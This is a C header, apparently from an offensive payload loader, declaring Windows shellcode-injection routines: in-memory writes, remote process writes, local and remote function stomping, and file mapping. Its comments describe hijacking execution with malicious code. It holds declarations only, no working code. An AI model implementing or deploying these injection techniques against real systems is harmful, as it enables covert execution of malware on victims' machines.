#ifndef PAYLOAD_LOADING_H
#define PAYLOAD_LOADING_H

#include "../../common.h";

BOOL payload_loading(PVOID* pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize, ...);

/**
 * @brief Writes a payload into a dynamically allocated executable memory region.
 * 
 * @param[out] pAddress Pointer to store the allocated memory address where the payload is written.
 * @param[in] pPayload Pointer to the payload data to be written into memory.
 * @param[in] sPayloadSize Size of the payload in bytes.
 * 
 * @return TRUE if the payload is successfully written, FALSE otherwise.
 * 
 * @name In Memory
 * @flags
 */
BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize);

BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pAddress);

/**
 * @brief Overwrites a function's memory section with a payload.
 * 
 * This technique replaces an existing function with malicious code, allowing execution hijacking.
 * 
 * @param[out] pAddress Pointer to the function address to be stomped.
 * @param[in] pPayload Pointer to the payload to inject.
 * @param[in] sPayloadSize Size of the payload in bytes.
 * 
 * @return TRUE if successful, FALSE if memory protection changes fail.
 * 
 * @name Function Stomping
 * @flags FUNCTION_STOMPING
 */
BOOL WritePayloadViaLocalFunctionStomping(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize);

/**
 * @brief Overwrites a function's memory section in a remote process with a payload.
 * 
 * This function is intended to modify a function inside a remote process' memory.
 * 
 * @param[out] pAddress Pointer to the target function address in the remote process.
 * @param[in] pPayload Pointer to the payload to be injected.
 * @param[in] sPayloadSize Size of the payload in bytes.
 * 
 * @return TRUE if successful, FALSE otherwise.
 * 
 * @name Remote Function Stomping
 * @flags FUNCTION_STOMPING
 */
BOOL WritePayloadViaRemoteFunctionStomping(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize);

/**
 * @brief Writes a payload to a memory location via a local file mapping.
 * 
 * This function creates a file mapping in the local process and writes a given payload to it. 
 * 
 * @param[in] pPayload Pointer to the payload to be written.
 * @param[in] sPayloadSize Size of the payload in bytes.
 * @param[out] pAddress Pointer to the memory address where the payload is written.
 * 
 * @return TRUE if successful, FALSE otherwise.
 * 
 * @name Local File Mapping
 * @flags FILE_MAPPING
 */
BOOL  WritePayloadViaLocalFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress);

/**
 * @brief Writes a payload to a memory location via a remote file mapping.
 * 
 * This function creates a file mapping in a remote process and writes a given payload to it. 
 * 
 * @param[in] pPayload Pointer to the payload to be written.
 * @param[in] sPayloadSize Size of the payload in bytes.
 * @param[out] pAddress Pointer to the memory address where the payload is written.
 * 
 * @return TRUE if successful, FALSE otherwise.
 * 
 * @name Remote File Mapping
 * @flags FILE_MAPPING
 */
BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress, IN HANDLE hProcess);

#endif